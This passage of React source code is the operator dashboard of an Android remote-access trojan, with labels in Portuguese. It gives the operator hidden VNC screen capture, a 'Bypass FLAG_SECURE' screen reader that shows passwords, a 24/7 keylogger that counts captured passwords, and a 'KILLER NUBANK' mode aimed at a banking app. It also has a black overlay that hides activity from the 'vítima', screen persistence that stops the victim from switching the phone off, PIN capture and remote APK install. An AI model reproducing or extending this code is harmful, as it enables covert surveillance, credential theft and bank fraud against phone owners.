                  sendCommand({ action: 'CLICK', x: deviceDownX, y: deviceDownY });
                }
                setMouseDownPos(null);
                setIsDragging(false);
                dragPathRef.current = [];
              }}
            >
              {screenHierarchy && screenHierarchy.hierarchy ? (
                <ScreenReaderCanvas
                  hierarchy={screenHierarchy.hierarchy}
                  maxHeight={400}
                />
              ) : (
                <div className="h-[400px] flex items-center justify-center">
                  <p className="text-gray-400 text-sm">Carregando V2...</p>
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* Controles Mobile */}
        <div className="px-3 py-3 space-y-2">
          {/* Navegação */}
          <div className="grid grid-cols-4 gap-2">
            <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-slate-700 text-white rounded-lg text-lg font-bold">◀</button>
            <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-slate-700 text-white rounded-lg text-lg font-bold">●</button>
            <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-slate-700 text-white rounded-lg text-lg font-bold">■</button>
            <button onClick={() => sendCommand({ action: 'POWER' })} className="py-3 bg-red-600 text-white rounded-lg text-lg font-bold">⏻</button>
          </div>
          
          {/* Ações */}
          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={toggleCapture}
              className={`py-2.5 rounded-lg text-sm font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-gray-700 text-white'}`}
            >
              {isCaptureEnabled ? '🔴 Captura Ativa' : '▶️ Iniciar Captura'}
            </button>
            <button
              onClick={toggleBlackScreen}
              className={`py-2.5 rounded-lg text-sm font-bold ${isBlackScreen ? 'bg-black text-white border-2 border-white' : 'bg-slate-700 text-white'}`}
            >
              {isBlackScreen ? '⬛ Tela Preta ON' : '⬜ Tela Preta'}
            </button>
          </div>
          
          <div className="grid grid-cols-2 gap-2">
            <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2.5 bg-indigo-600 text-white rounded-lg text-sm font-bold">
              🔔 Notificações
            </button>
            <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2.5 bg-indigo-600 text-white rounded-lg text-sm font-bold">
              ⚙️ Config. Rápidas
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ============================================
  // 🖥️ RENDERIZAÇÃO DESKTOP - ORIGINAL
  // ============================================
  return (
    <div className="min-h-screen bg-slate-900 relative">
      {/* OVERLAY DE DISPOSITIVO DESCONECTADO */}
      {!device.is_online && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-[100]">
          <div className="text-center p-8 bg-slate-800 rounded-2xl border-2 border-red-500 max-w-md mx-4">
            <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-5xl">📵</span>
            </div>
            <h2 className="text-2xl font-bold text-red-400 mb-2">Dispositivo Desconectado</h2>
            <p className="text-gray-400 mb-6">
              A conexão com o dispositivo foi perdida. Isso pode acontecer se:
            </p>
            <ul className="text-left text-gray-500 text-sm mb-6 space-y-1">
              <li>• O app foi fechado ou desinstalado</li>
              <li>• O dispositivo perdeu conexão com a internet</li>
              <li>• O dispositivo foi desligado</li>
              <li>• O usuário removeu as permissões</li>
            </ul>
            <button
              onClick={() => navigate('/dashboard')}
              className="w-full py-3 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition-all"
            >
              ← Voltar ao Dashboard
            </button>
          </div>
        </div>
      )}
      
      {/* Header */}
      <header className="bg-slate-800 border-b border-slate-700">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4">
              <button
                onClick={() => navigate('/dashboard')}
                className="p-2 hover:bg-slate-700 rounded-lg transition-colors"
              >
                <ArrowLeft className="w-5 h-5 text-gray-300" />
              </button>
              <div>
                <h1 className="text-lg font-bold text-white">{device.model}</h1>
                <p className="text-xs text-gray-400">{device.device_id}</p>
              </div>
              <div className={`px-3 py-1 rounded-full text-xs font-semibold ${
                device.is_online ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400 animate-pulse'
              }`}>
                {device.is_online ? '● Online' : '● Offline'}
              </div>
            </div>
            <div className="flex items-center space-x-2">
              {/* 🪟 Botão Modo Flutuante */}
              <button
                onClick={() => setIsFloatingMode(!isFloatingMode)}
                className={`flex items-center space-x-2 px-3 py-2 rounded-lg text-sm transition-colors ${
                  isFloatingMode 
                    ? 'bg-purple-600 hover:bg-purple-700 text-white' 
                    : 'bg-slate-700 hover:bg-slate-600 text-white'
                }`}
                title="Modo Flutuante - Arraste janelas livremente"
              >
                <Layout className="w-4 h-4" />
                <span>{isFloatingMode ? '🪟 Flutuante' : '🪟 Modo Flutuante'}</span>
              </button>
              
              <button
                onClick={onLogout}
                className="flex items-center space-x-2 px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm transition-colors"
              >
                <LogOut className="w-4 h-4" />
                <span>Sair</span>
              </button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-[1600px] mx-auto px-4 sm:px-6 lg:px-8 py-4">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4">
          
          {/* ===== COLUNA ESQUERDA: Navegação, Desbloqueio, Texto ===== */}
          <div className="space-y-3 order-2 lg:order-1">
            {/* Botões de Navegação Android */}
            <div className="bg-slate-800 rounded-lg p-3 border border-slate-700">
              <h3 className="text-white font-semibold mb-2 flex items-center text-sm">
                📱 Navegação Android
              </h3>
              
              {/* Botão Power - Clique normal = liga/desliga tela, Segurar = menu desligar/reiniciar */}
              <div 
                className="relative"
                onMouseDown={handlePowerMouseDown}
                onMouseUp={handlePowerMouseUp}
                onMouseLeave={handlePowerMouseLeave}
                onTouchStart={handlePowerMouseDown}
                onTouchEnd={handlePowerMouseUp}
              >
                <EditableButton
                  id="btn-power"
                  onClick={() => {}} // Handled by mouse events
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-power']}
                  onStyleChange={(style) => updateButtonStyle('btn-power', style)}
                  className={`w-full py-2 mb-2 text-white rounded-lg font-semibold transition-all flex items-center justify-center text-sm ${
                    isPowerLongPressed 
                      ? 'bg-orange-600 scale-95' 
                      : 'bg-red-600 hover:bg-red-700'
                  }`}
                >
                  <Power className="w-4 h-4 mr-2" />
                  {isPowerLongPressed ? '⏳ Menu...' : 'Power'}
                </EditableButton>
                <div className="absolute -bottom-5 left-0 right-0 text-center text-xs text-gray-400">
                  Segure para menu
                </div>
              </div>
              <div className="mb-4"></div>
              
              {/* Botões de navegação */}
              <div className="grid grid-cols-3 gap-1">
                <EditableButton
                  id="btn-back"
                  onClick={() => sendCommand({ action: 'BACK' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-back']}
                  onStyleChange={(style) => updateButtonStyle('btn-back', style)}
                  className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded font-bold transition-all flex flex-col items-center justify-center"
                  title="Voltar"
                >
                  <span className="text-lg">◀</span>
                  <span className="text-[10px]">Back</span>
                </EditableButton>
                
                <EditableButton
                  id="btn-home"
                  onClick={() => sendCommand({ action: 'HOME' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-home']}
                  onStyleChange={(style) => updateButtonStyle('btn-home', style)}
                  className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded font-bold transition-all flex flex-col items-center justify-center"
                  title="Tela Inicial"
                >
                  <span className="text-lg">●</span>
                  <span className="text-[10px]">Home</span>
                </EditableButton>
                
                <EditableButton
                  id="btn-recents"
                  onClick={() => sendCommand({ action: 'RECENTS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-recents']}
                  onStyleChange={(style) => updateButtonStyle('btn-recents', style)}
                  className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded font-bold transition-all flex flex-col items-center justify-center"
                  title="Apps Recentes"
                >
                  <span className="text-lg">■</span>
                  <span className="text-[10px]">Recents</span>
                </EditableButton>
              </div>
              
              {/* Controle Rápido */}
              <div className="mt-2">
                <p className="text-[10px] text-gray-400 font-semibold mb-1 uppercase tracking-wide">Controle Rápido</p>
                <div className="grid grid-cols-5 gap-1">
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VIBRATE' })}
                    className="py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-[10px] font-bold"
                    title="Vibrar"
                  >
                    📳
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VOLUME_DOWN' })}
                    className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold"
                    title="Volume -"
                  >
                    🔉
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VOLUME_UP' })}
                    className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold"
                    title="Volume +"
                  >
                    🔊
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'LOCK_DEVICE' })}
                    className="py-2 bg-red-800 hover:bg-red-700 text-white rounded text-[10px] font-bold"
                    title="Bloquear tela"
                  >
                    🔒
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'SNAP_SCREEN' })}
                    className="py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-[10px] font-bold"
                    title="Screenshot"
                  >
                    📷
                  </button>
                </div>
              </div>
              
              {/* Botões extras */}
              <div className="grid grid-cols-2 gap-1 mt-2">
                <EditableButton
                  id="btn-notifications"
                  onClick={() => sendCommand({ action: 'NOTIFICATIONS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-notifications']}
                  onStyleChange={(style) => updateButtonStyle('btn-notifications', style)}
                  className="py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded font-semibold transition-all flex items-center justify-center text-xs"
                  title="Abrir Notificações"
                >
                  🔔 Notif.
                </EditableButton>
                
                <EditableButton
                  id="btn-quick-settings"
                  onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-quick-settings']}
                  onStyleChange={(style) => updateButtonStyle('btn-quick-settings', style)}
                  className="py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded font-semibold transition-all flex items-center justify-center text-xs"
                  title="Configurações Rápidas"
                >
                  ⚙️ Config.
                </EditableButton>
              </div>
              
              {/* Botão de Apps Instalados */}
              <EditableButton
                id="btn-apps"
                onClick={() => {
                  setShowAppsModal(true);
                  fetchInstalledApps();
                }}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-apps']}
                onStyleChange={(style) => updateButtonStyle('btn-apps', style)}
                className="w-full mt-2 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg font-semibold transition-all flex items-center justify-center text-sm"
              >
                📱 Apps Instalados
              </EditableButton>
              
              {/* Botão de Instalar APK */}
              <EditableButton
                id="btn-install-apk"
                onClick={() => setShowInstallApkModal(true)}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-install-apk']}
                onStyleChange={(style) => updateButtonStyle('btn-install-apk', style)}
                className="w-full mt-2 py-2 bg-orange-600 hover:bg-orange-700 text-white rounded-lg font-semibold transition-all flex items-center justify-center text-sm"
              >
                📦 Instalar APK
              </EditableButton>
              
              {/* 🔧 Botão de Configurar ROM - Autostart, Battery, etc */}
              <EditableButton
                id="btn-configure-rom"
                onClick={() => setShowConfigureRomConfirm(true)}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-configure-rom']}
                onStyleChange={(style) => updateButtonStyle('btn-configure-rom', style)}
                className="w-full mt-2 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg font-semibold transition-all flex items-center justify-center text-sm"
                title="Configura Autostart, Otimização de Bateria, etc automaticamente"
              >
                🔧 Configurar ROM
              </EditableButton>
              
              {/* 🔒 LOCKSCREEN PIN - Igual EAGLESPY V5 */}
              <EditableButton
                id="btn-lockscreen"
                onClick={() => setShowLockscreenModal(true)}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-lockscreen']}
                onStyleChange={(style) => updateButtonStyle('btn-lockscreen', style)}
                className="w-full mt-2 py-2 bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white rounded-lg font-semibold transition-all flex items-center justify-center text-sm"
              >
                🔒 Lockscreen PIN
              </EditableButton>
              
              {/* 🔒 Botão de Persistência de Tela - Não deixa vítima desligar */}
              <div className="flex gap-2 mt-2">
                <button
                  onClick={() => {
                    sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: true });
                    addLog('🔒 Persistência de tela ATIVADA - Vítima não consegue desligar!');
                  }}
                  className="flex-1 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition-all text-sm"
                  title="Ativa persistência - Não deixa a vítima desligar a tela"
                >
                  🔒 Tela ON
                </button>
                <button
                  onClick={() => {
                    sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: false });
                    addLog('🔓 Persistência de tela DESATIVADA');
                  }}
                  className="flex-1 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg font-semibold transition-all text-sm"
                  title="Desativa persistência - Permite desligar normalmente"
                >
                  🔓 Normal
                </button>
              </div>
            </div>

            {/* Digitar Texto */}
            <div className="bg-slate-800 rounded-lg p-3 border border-slate-700">
              <h3 className="text-white font-semibold mb-2 flex items-center text-sm">
                <MessageSquare className="w-4 h-4 mr-2" />
                Digitar Texto
              </h3>
              <div className="space-y-2">
                <input
                  type="text"
                  value={textToSend}
                  onChange={(e) => setTextToSend(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                  placeholder="Digite o texto..."
                  className="w-full px-2 py-2 bg-slate-700 border border-slate-600 rounded text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-600 text-sm"
                />
                <EditableButton
                  id="btn-send-text"
                  onClick={handleSendText}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-send-text']}
                  onStyleChange={(style) => updateButtonStyle('btn-send-text', style)}
                  disabled={!textToSend.trim()}
                  className="w-full py-2 bg-purple-600 hover:bg-purple-700 disabled:bg-slate-700 disabled:text-gray-500 text-white rounded transition-colors text-sm"
                >
                  Enviar
                </EditableButton>
              </div>
            </div>
          </div>

          {/* ===== COLUNA CENTRAL: VNC Screen + Screen Reader V2 ===== */}
          <div id="device-viewer" className="lg:col-span-2 space-y-2 order-1 lg:order-2">
            {/* Tabs para alternar entre VNC e Screen Reader */}
            <div className="flex space-x-2 bg-slate-800 p-2 rounded-lg border border-slate-700">
              <button
                onClick={() => setShowScreenReader(false)}
                className={`flex-1 py-2 rounded font-semibold transition-all ${
                  !showScreenReader
                    ? 'bg-purple-600 text-white'
                    : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
                }`}
              >
                📺 VNC Normal
              </button>
              <button
                onClick={() => {
                  setShowScreenReader(true);
                  if (!isScreenReaderEnabled) toggleScreenReader();
                }}
                className={`flex-1 py-2 rounded font-semibold transition-all ${
                  showScreenReader
                    ? 'bg-green-600 text-white'
                    : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
                }`}
              >
                <Eye className="w-4 h-4 inline mr-1" />
                V2 {isScreenReaderEnabled && '✅'}
              </button>
              <button
                onClick={() => setIsExpandedMode(true)}
                className="px-3 py-2 rounded font-semibold transition-all text-sm bg-blue-600 hover:bg-blue-700 text-white"
                title="Expandir VNC + V2 lado a lado"
              >
                ⛶ Expandir
              </button>
            </div>
            
            {/* Conteúdo */}
            {!showScreenReader ? (
              isCaptureEnabled ? (
                <div className="mx-auto" style={{ maxWidth: '450px' }}>
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    captureMethod="silent"
                    killerFrameOnPointerMove={isKillerMode}
                    onRequestFrame={requestKillerFrame}
                  />
                </div>
              ) : (
                // Tela preta quando captura não está ativada
                <div className="bg-black rounded-lg flex flex-col items-center justify-center" style={{ height: '500px' }}>
                  <div className="text-center p-8">
                    <div className="text-6xl mb-4">📺</div>
                    <h3 className="text-white text-xl font-bold mb-2">Captura Desativada</h3>
                    <p className="text-gray-400 text-sm mb-4">
                      Clique em "Iniciar Captura" para ver a tela do dispositivo
                    </p>
                    <button
                      onClick={toggleCapture}
                      className="px-6 py-3 bg-gradient-to-r from-gray-800 to-black hover:from-gray-700 hover:to-gray-900 text-white font-bold rounded-lg border border-gray-600 transition-all"
                    >
                      ▶️ Iniciar Captura
                    </button>
                  </div>
                </div>
              )
            ) : (
              <div 
                className={`bg-slate-900 border border-green-500 rounded-lg overflow-hidden flex flex-col mx-auto ${isLayoutEditMode ? 'ring-2 ring-green-500 ring-offset-2 ring-offset-gray-900' : ''}`}
                style={{ maxWidth: '400px' }}
              >
                <div className="flex items-center justify-between p-3 bg-gradient-to-r from-slate-800 to-slate-900 border-b border-green-500/50">
                  <div className="flex items-center space-x-4">
                    <div>
                      <div className="text-white font-bold text-base flex items-center">
                        <Eye className="w-5 h-5 mr-2 text-green-400" />
                        Screen Reader V2 - Bypass FLAG_SECURE
                      </div>
                      {screenHierarchy && (
                        <p className="text-xs text-green-300/70">📱 {screenHierarchy.package}</p>
                      )}
                    </div>
                  </div>
                  {isScreenReaderEnabled && (
                    <div className="flex items-center space-x-3">
                      <div className="text-xs bg-green-600/30 text-green-300 px-2 py-1 rounded flex items-center">
                        <div className="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></div>
                        ~10 FPS
                      </div>
                      <div className="text-xs bg-yellow-600/30 text-yellow-300 px-2 py-1 rounded">
                        🔒 Senhas Visíveis
                      </div>
                    </div>
                  )}
                </div>
                
                {!isScreenReaderEnabled ? (
                  <div className="flex items-center justify-center h-full">
                    <div className="text-center">
                      <Eye className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                      <p className="text-gray-400">Ative o Screen Reader V2 para começar</p>
                      <button
                        onClick={toggleScreenReader}
                        className="mt-4 px-6 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg"
                      >
                        Ativar Screen Reader
                      </button>
                    </div>
                  </div>
                ) : screenHierarchy ? (
                  <div 
                    className="relative bg-slate-950 cursor-crosshair flex items-center justify-center" 
                    style={{ 
                      overflow: 'hidden',
                      padding: '10px'
                    }}
                    onMouseDown={(e) => {
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      
                      setMouseDownPos({ x, y });
                      setMouseDownTime(Date.now());
                      setIsDragging(true);
                      dragPathRef.current = [{ x, y }]; // Inicia o caminho
                    }}
                    onMouseMove={(e) => {
                      // Só captura se estiver arrastando
                      if (!isDragging || !mouseDownPos) return;
                      
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      
                      // Adiciona ponto ao caminho (com intervalo mínimo para não sobrecarregar)
                      const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                      const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                      if (dist > 15) { // Só adiciona se moveu pelo menos 15px
                        dragPathRef.current.push({ x, y });
                      }
                    }}
                    onMouseUp={(e) => {
                      if (!mouseDownPos) return;
                      
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const upX = e.clientX - rect.left;
                      const upY = e.clientY - rect.top;
                      
                      const downX = mouseDownPos.x;
                      const downY = mouseDownPos.y;
                      
                      const deltaX = upX - downX;
                      const deltaY = upY - downY;
                      const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                      const holdTime = Date.now() - mouseDownTime;
                      
                      // Calcula escala REAL baseada no tamanho renderizado do elemento
                      const realScale = rect.width / SCREEN_BASE_WIDTH;
                      
                      // Converte para coordenadas do dispositivo usando escala real
                      const deviceDownX = Math.round(downX / realScale);
                      const deviceDownY = Math.round(downY / realScale);
                      const deviceUpX = Math.round(upX / realScale);
                      const deviceUpY = Math.round(upY / realScale);
                      
                      // Valida limites
                      if (deviceDownX < 0 || deviceDownX > SCREEN_BASE_WIDTH || deviceDownY < 0 || deviceDownY > SCREEN_BASE_HEIGHT) {
                        setMouseDownPos(null);
                        setIsDragging(false);
                        dragPathRef.current = [];
                        return;
                      }
                      
                      // Long Press (segurou mais de 500ms sem mover muito)
                      if (holdTime > 500 && distance < 10) {
                        sendCommand({ 
                          action: 'LONG_PRESS',
                          x: deviceDownX,
                          y: deviceDownY
                        });
                        addLog(`🕐 Long Press: (${deviceDownX}, ${deviceDownY})`);
                      }
                      // Swipe/Pattern (moveu mais de 30px)
                      else if (distance > 30) {
                        sendCommand({ 
                          action: 'SWIPE',
                          x1: deviceDownX,
                          y1: deviceDownY,
                          x2: deviceUpX,
                          y2: deviceUpY
                        });
                        addLog(`👉 Swipe: (${deviceDownX},${deviceDownY}) → (${deviceUpX},${deviceUpY})`);
                      }
                      // Click normal
                      else {
                        sendCommand({ 
                          action: 'CLICK',
                          x: deviceDownX,
                          y: deviceDownY
                        });
                        addLog(`🖱️ Click: (${deviceDownX}, ${deviceDownY})`);
                      }
                      
                      setMouseDownPos(null);
                      setIsDragging(false);
                      dragPathRef.current = [];
                    }}
                    onMouseLeave={() => {
                      // Cancela arraste se sair da área
                      if (isDragging) {
                        setMouseDownPos(null);
                        setIsDragging(false);
                        dragPathRef.current = [];
                      }
                    }}
                    ref={(el) => {
                      if (el && screenHierarchy) {
                        // Calcula escala baseado no container (mesma lógica do VNC)
                        const containerWidth = el.clientWidth;
                        const containerHeight = el.clientHeight;
                        
                        const scaleX = containerWidth / SCREEN_BASE_WIDTH;
                        const scaleY = containerHeight / SCREEN_BASE_HEIGHT;
                        const newScale = Math.min(scaleX, scaleY);
                        
                        if (newScale !== screenScale) {
                          setScreenScale(newScale);
                        }
                      }
                    }}
                  >
                    {/* Canvas responsivo que se adapta ao container */}
                    <div 
                      data-screen="true"
                      className="relative bg-slate-950 overflow-hidden rounded-lg shadow-2xl shadow-green-500/20 border border-green-500/30" 
                      style={{ 
                        width: '320px', // Largura fixa para boa visualização
                        aspectRatio: `${SCREEN_BASE_WIDTH} / ${SCREEN_BASE_HEIGHT}`
                      }}
                    >
                      <ScreenReaderCanvas hierarchy={screenHierarchy.hierarchy} scale={1} />
                    </div>
                  </div>
                ) : (
                  <div className="flex items-center justify-center h-full">
                    <div className="text-center text-gray-500">
                      <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-500 mx-auto mb-4"></div>
                      Aguardando dados da tela...
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* ===== COLUNA DIREITA: Controles ===== */}
          <div className="space-y-3 order-3">
            <div className="bg-gradient-to-br from-indigo-900/50 to-black/80 rounded-lg p-3 border-2 border-indigo-600/70">
              <h3 className="text-indigo-300 font-bold mb-2 flex items-center text-sm">
                HVNC (takeScreenshot)
              </h3>
              <div className="flex gap-2 mb-2">
                <button
                  onClick={toggleCapture}
                  className={`flex-1 py-3 rounded-lg font-bold transition-all ${
                    isCaptureEnabled
                      ? 'bg-indigo-700 hover:bg-indigo-800 text-white shadow-lg shadow-indigo-500/20'
                      : 'bg-gray-800 hover:bg-gray-700 text-indigo-300 border border-indigo-600/50'
                  }`}
                  title={isCaptureEnabled ? 'Pausar captura' : 'Iniciar HVNC silencioso (Android 11+)'}
                >
                  {isCaptureEnabled ? 'HVNC Ativo' : 'Iniciar Captura'}
                </button>
                <button
                  onClick={restartCapture}
                  className="px-3 py-3 bg-gradient-to-r from-indigo-700 to-purple-700 hover:from-indigo-800 hover:to-purple-800 text-white rounded-lg font-bold transition-all shadow-lg shadow-indigo-500/20"
                  title="Reiniciar HVNC se perdeu frames"
                >
                  🔄
                </button>
              </div>
              <div className={`mt-3 space-y-1.5 ${!isCaptureEnabled ? 'opacity-50' : ''}`}>
                <div className="flex items-center justify-between text-[10px] text-indigo-300/90">
                  <span>Qualidade WEBP</span>
                  <span className="font-mono font-bold text-indigo-200">{silentQuality}%</span>
                </div>
                <input
                  type="range"
                  min={10}
                  max={100}
                  step={5}
                  value={silentQuality}
                  onChange={(e) => setSilentQuality(Number(e.target.value))}
                  onMouseUp={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                  onTouchEnd={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                  disabled={!isCaptureEnabled}
                  className="w-full h-2 accent-indigo-500 cursor-pointer disabled:cursor-not-allowed"
                  title="Reduza para melhorar a conexão; aumente para imagem mais nítida"
                />
                <div className="flex justify-between text-[9px] text-indigo-400/60">
                  <span>10% conexão</span>
                  <span>100% nitidez</span>
                </div>
              </div>
              <p className="text-[9px] text-indigo-400/70 text-center mt-2">
                {isCaptureEnabled
                  ? 'Pipeline 0x01 • takeScreenshot • sem popup do sistema'
                  : 'Requer Android 11+ e serviço de acessibilidade ativo'}
              </p>
            </div>

            <div className="bg-gradient-to-br from-amber-950/60 to-black/80 rounded-lg p-3 border-2 border-amber-600/70">
              <div className="flex items-center justify-between gap-3">
                <div>
                  <h3 className="text-amber-300 font-bold text-sm">KILLER NUBANK</h3>
                  <p className="text-[9px] text-amber-400/70 mt-0.5">
                    Silencia keylogger e reduz frames HVNC
                  </p>
                </div>
                <button
                  type="button"
                  role="switch"
                  aria-checked={isKillerMode}
                  onClick={toggleKillerMode}
                  className={`relative inline-flex h-7 w-12 shrink-0 cursor-pointer rounded-full border-2 transition-colors ${
                    isKillerMode
                      ? 'bg-amber-600 border-amber-400'
                      : 'bg-gray-800 border-amber-700/50'
                  }`}
                  title={isKillerMode ? 'Desativar killer mode' : 'Ativar killer mode para apps financeiros'}
                >
                  <span
                    className={`pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform mt-0.5 ${
                      isKillerMode ? 'translate-x-5' : 'translate-x-0.5'
                    }`}
                  />
                </button>
              </div>
              <p className="text-[9px] text-amber-400/60 text-center mt-2">
                {isKillerMode
                  ? 'Ativo — A11y silenciada • frame só ao mover/clicar no viewer'
                  : 'Inativo — operação normal'}
              </p>
            </div>
            
            {/* Tela Preta */}
            <div className="bg-slate-800 rounded-lg p-3 border border-slate-700">
              <h3 className="text-white font-semibold mb-2 flex items-center text-sm">
                <Power className="w-4 h-4 mr-2" />
                Controle de Tela
              </h3>
              <div className="flex gap-2">
                <EditableButton
                  id="btn-black-screen"
                  onClick={toggleBlackScreen}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-black-screen']}
                  onStyleChange={(style) => updateButtonStyle('btn-black-screen', style)}
                  className={`flex-1 py-2 rounded-lg font-semibold transition-all text-sm ${
                    isBlackScreen
                      ? 'bg-red-600 hover:bg-red-700 text-white'
                      : 'bg-orange-600 hover:bg-orange-700 text-white'
                  }`}
                >
                  {isBlackScreen ? '🔴 Desativar' : '⬛ Tela Preta'}
                </EditableButton>
                <button
                  onClick={() => setShowBlackScreenEditor(true)}
                  className="px-3 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg font-semibold transition-all text-sm"
                  title="Personalizar tela preta"
                >
                  🎨
                </button>
              </div>
              {customBlackScreenTemplate && (
                <p className="text-xs text-purple-400 mt-1">
                  📋 Template: {customBlackScreenTemplate.name}
                </p>
              )}
              {isBlackScreen && (
                <div className="flex flex-col gap-1 p-2 bg-slate-900/50 rounded-lg mt-2 border border-slate-600">
                  <div className="flex justify-between text-xs text-slate-400 font-medium">
                    <span>Opacidade da Tela Preta (Vítima)</span>
                    <span className="text-cyan-400 font-mono">{blackScreenOpacity}%</span>
                  </div>
                  <input
                    type="range"
                    min={10}
                    max={100}
                    value={blackScreenOpacity}
                    onChange={(e) => handleBlackScreenOpacityChange(parseInt(e.target.value, 10))}
                    className="w-full h-1 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-cyan-500"
                  />
                </div>
              )}
            </div>

            {/* Keylogger 24/7 - Sistema Completo */}
            <div className="bg-gradient-to-br from-slate-800 to-yellow-900/20 rounded-lg p-3 border border-yellow-700/30">
              <div className="flex items-center justify-between mb-2">
                <h3 className="text-white font-semibold flex items-center text-sm">
                  <Keyboard className="w-4 h-4 mr-2 text-yellow-400" />
                  Keylogger 24/7
                </h3>
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                  <span className="text-[10px] text-green-400">● Ativo</span>
                </div>
              </div>
              
              {/* Resumo Rápido */}
              {keylogSummary && (
                <div className="grid grid-cols-3 gap-1 mb-2">
                  <div className="bg-slate-900/50 rounded p-1 text-center">
                    <div className="text-sm font-bold text-yellow-400">{keylogSummary.total_logs || 0}</div>
                    <div className="text-[8px] text-gray-500">Total</div>
                  </div>
                  <div className="bg-slate-900/50 rounded p-1 text-center">
                    <div className="text-sm font-bold text-green-400">{keylogSummary.today_logs || 0}</div>
                    <div className="text-[8px] text-gray-500">Hoje</div>
                  </div>
                  <div className="bg-slate-900/50 rounded p-1 text-center">
                    <div className="text-sm font-bold text-red-400">{keylogSummary.passwords_captured || 0}</div>
                    <div className="text-[8px] text-gray-500">Senhas</div>
                  </div>
                </div>
              )}
              
              {/* Botão para abrir painel completo */}
              <button 
                onClick={() => {
                  // Ativa modo flutuante se não estiver ativo
                  if (!isFloatingMode) {
                    setIsFloatingMode(true);
                  }
                  // Abre a janela do keylogger
